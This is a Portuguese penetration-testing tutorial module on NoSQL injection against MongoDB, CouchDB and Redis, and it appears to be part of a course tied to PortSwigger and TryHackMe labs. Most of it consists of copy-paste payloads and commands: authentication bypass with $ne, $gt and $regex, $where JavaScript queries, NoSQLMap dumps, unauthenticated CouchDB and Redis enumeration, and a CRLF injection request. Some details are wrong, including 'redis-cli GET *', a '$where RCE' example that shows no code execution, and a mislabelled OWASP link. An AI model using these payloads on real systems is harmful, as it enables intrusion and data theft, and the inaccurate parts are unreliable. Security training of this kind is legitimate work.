# 🍃 03. NoSQL Injection — MongoDB, CouchDB e Redis

> Bancos NoSQL não usam SQL, mas também são vulneráveis a injeção. E muitas vezes nem precisam de senha.

<div align="center">

| ⏱️ Tempo | 📊 Nível | 🔧 Ferramentas |
|:--------:|:--------:|:--------------:|
| 50min | ⭐⭐ Intermediário | `NoSQLMap, curl, Burp Repeater` |

</div>

---

## 🎓 Por que isso importa?

Bancos NoSQL (MongoDB, CouchDB, Redis) são usados em aplicações modernas. Diferente de SQL, eles usam **operadores de consulta** ($gt, $ne, $regex) que podem ser manipulados para bypass de autenticação e extração de dados.

**Analogia:** Imagine que você pergunta ao porteiro "Qual a senha?" e ele responde "Sim" porque sua pergunta era "A senha é maior que nada?" — uma pergunta que sempre retorna verdadeiro.

**Impacto real:**
- **Bypass de autenticação** — acessar sem senha
- **Extração de dados** — dump de coleções inteiras
- **RCE** — em MongoDB com configuração perigosa
- **DoS** — consumir recursos do servidor

---

## 📋 Pré-requisitos

| Conhecimento | Necessário? | Onde aprender |
|:-------------|:-----------:|:-------------:|
| HTTP basics | Sim | Módulo 00 |
| JSON basics | Sim | Este arquivo explica |
| O que é MongoDB/CouchDB | Sim | Este arquivo explica |

---

## 🎯 Quando testar NoSQL Injection

- Quando a app usa **APIs REST com JSON** como input
- Para testar endpoints de **login** (bypass de autenticação)
- Quando a app usa **MongoDB, CouchDB, Redis**
- Para testar **parâmetros de busca** ($gt, $ne, $regex)

---

## 🔄 Como funciona na prática

```
┌──────────────┐         ┌──────────────────┐         ┌──────────────┐
│   Atacante   │ ──JSON─►│   App Web        │ ──query─►│   MongoDB    │
│   {"$gt":""} │         │  (concatena)     │         │   (banco)    │
└──────────────┘         └──────────────────┘         └──────────────┘
                                │
                                ▊ Query original:
                                ▊ db.users.find({user: "admin", pass: "x"})
                                ▊
                                ▊ Query modificada:
                                ▊ db.users.find({user: "admin", pass: {$gt:""}})
                                ▊ → retorna TODOS os users (pass > "")
                                ▼
                         ┌──────────────┐
                         │  Login bypass │
                         │  sem senha    │
                         └──────────────┘
```

---

## 📝 MongoDB Injection

### Operadores MongoDB Perigosos

| Operador | O que faz | Exemplo |
|----------|-----------|---------|
| `$gt` | Greater than (maior que) | `{"$gt":""}` — sempre verdadeiro |
| `$ne` | Not equal (diferente de) | `{"$ne":""}` — sempre verdadeiro |
| `$regex` | Regex match | `{"$regex":".*"}` — corresponde a tudo |
| `$where` | Executa JavaScript | `{"$where":"1==1"}` — sempre verdadeiro |
| `$exists` | Campo existe | `{"$exists":true}` |
| `$in` | Valor em lista | `{"$in":["admin","root"]}` |

### Bypass de Autenticação

```bash
# Login original
POST /api/login HTTP/1.1
Content-Type: application/json

{"user": "admin", "pass": "senha123"}

# Bypass com $ne
POST /api/login HTTP/1.1
Content-Type: application/json

{"user": "admin", "pass": {"$ne": ""}}

# Bypass com $gt
POST /api/login HTTP/1.1
Content-Type: application/json

{"user": "admin", "pass": {"$gt": ""}}

# Bypass com $regex
POST /api/login HTTP/1.1
Content-Type: application/json

{"user": {"$regex": ".*"}, "pass": {"$regex": ".*"}}
```

### Extração de Dados

```bash
# Extrair todos os usuários
POST /api/search HTTP/1.1
Content-Type: application/json

{"user": {"$ne": ""}}

# Extrair usuários específicos
POST /api/search HTTP/1.1
Content-Type: application/json

{"user": {"$regex": "^admin"}}

# Extrair via $where (JavaScript)
POST /api/search HTTP/1.1
Content-Type: application/json

{"$where": "1==1"}

# Extrair senhas
POST /api/search HTTP/1.1
Content-Type: application/json

{"pass": {"$ne": ""}, "user": "admin"}
```

### NoSQLMap

```bash
# Instalar
git clone https://github.com/codingo/NoSQLMap.git
cd NoSQLMap
pip3 install -r requirements.txt

# Scan básico
python nosqlmap.py -u http://target.com/api/login -d user=admin -p password

# Dump de dados
python nosqlmap.py -u http://target.com/api/search -d query=test --dump

# Bypass de autenticação
python nosqlmap.py -u http://target.com/api/login -d user=admin -p password --bypass
```

---

## 📝 CouchDB Injection

```bash
# CouchDB usa API REST — testar diretamente

# Listar databases
curl -X GET http://target.com:5984/_all_dbs

# Listar documentos de uma database
curl -X GET http://target.com:5984/users/_all_docs

# Extrair documento específico
curl -X GET http://target.com:5984/users/admin

# Injection via _find
curl -X POST http://target.com:5984/users/_find \
  -H "Content-Type: application/json" \
  -d '{"selector": {"password": {"$gt": ""}}}'

# Injection via _changes
curl -X GET http://target.com:5984/users/_changes

# CouchDB sem autenticação (configuração padrão)
curl -X GET http://target.com:5984/_membership
```

---

## 📝 Redis Injection

```bash
# Redis raramente tem autenticação padrão

# Conectar e listar chaves
redis-cli -h target.com KEYS *

# Dump de todas as chaves
redis-cli -h target.com GET *

# Injetar via HTTP (se Redis exposto via API)
curl -X POST http://target.com/api/redis \
  -d '{"command": "KEYS *"}'

# Injetar via CRLF
curl -X GET "http://target.com/api/cache?key=*%0d%0aINFO%0d%0a"

# Redis sem autenticação
redis-cli -h target.com
> INFO
> KEYS *
> GET session:admin
```

---

## 📝 Exemplos Práticos

### Exemplo 1: Bypass de Login MongoDB

```bash
# 1. Identificar API que aceita JSON
curl -X POST http://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"user":"admin","pass":"wrong"}'
# Output: {"error":"invalid credentials"}

# 2. Testar bypass com $ne
curl -X POST http://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"user":"admin","pass":{"$ne":""}}'
# Output: {"token":"eyJhbGciOiJIUzI1NiJ9..."}
# Login bypass confirmado!
```

### Exemplo 2: Extração via Burp Repeater

```bash
# 1. Interceptar request de busca
# 2. Enviar para Repeater (Ctrl+R)
# 3. Modificar JSON:

POST /api/users/search HTTP/1.1
Host: target.com
Content-Type: application/json

{"username": {"$ne": ""}}

# 4. Response retorna todos os usuários
```

### Exemplo 3: MongoDB $where RCE

```bash
# Se $where está habilitado (perigoso!)
POST /api/search HTTP/1.1
Content-Type: application/json

{"$where": "function() { return db.getCollectionNames().length > 0; }"}

# Extrair nomes de coleções
POST /api/search HTTP/1.1
Content-Type: application/json

{"$where": "function() { var x = db.admin.findOne(); return x != null; }"}
```

---

## 📋 Cheat Sheet Rápido

### Payloads MongoDB (copiar e colar)

```json
{"user": {"$ne": ""}}
{"user": {"$gt": ""}}
{"user": {"$regex": ".*"}}
{"pass": {"$ne": ""}}
{"$where": "1==1"}
{"user": {"$in": ["admin", "root"]}}
```

### Payloads CouchDB

```bash
curl -X GET http://target.com:5984/_all_dbs
curl -X GET http://target.com:5984/users/_all_docs
curl -X POST http://target.com:5984/users/_find \
  -d '{"selector": {"password": {"$gt": ""}}}'
```

### Payloads Redis

```bash
redis-cli -h target.com KEYS *
redis-cli -h target.com GET session:admin
```

---

## 🧪 Labs Práticos

| # | Plataforma | Lab | Tópicos | Tempo |
|---|:----------:|:----|:--------|:-----:|
| 1 | PortSwigger | [NoSQL injection](https://portswigger.net/web-security/nosql-injection) | MongoDB injection | 15min |
| 2 | PortSwigger | [NoSQL injection — operator smuggling](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-operator-smuggling) | Operator bypass | 20min |
| 3 | TryHackMe | [NoSQL Injection](https://tryhackme.com/room/nosqli) | MongoDB/CouchDB | 30min |

---

## 📚 Referências

- [PortSwigger — NoSQL Injection](https://portswigger.net/web-security/nosql-injection)
- [HackTricks — NoSQL Injection](https://book.hacktricks.xyz/pentesting-web/nosql-injection)
- [NoSQLMap](https://github.com/codingo/NoSQLMap)
- [OWASP — NoSQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection)

---

## ✅ Validação

Após este módulo, você deve conseguir:

- [ ] Identificar APIs que usam MongoDB/CouchDB/Redis
- [ ] Bypass de autenticação com operadores $ne, $gt
- [ ] Extrair dados com $where e $regex
- [ ] Usar NoSQLMap para automação
- [ ] Testar CouchDB sem autenticação
- [ ] Testar Redis exposto
- [ ] Completar os labs PortSwigger de NoSQL
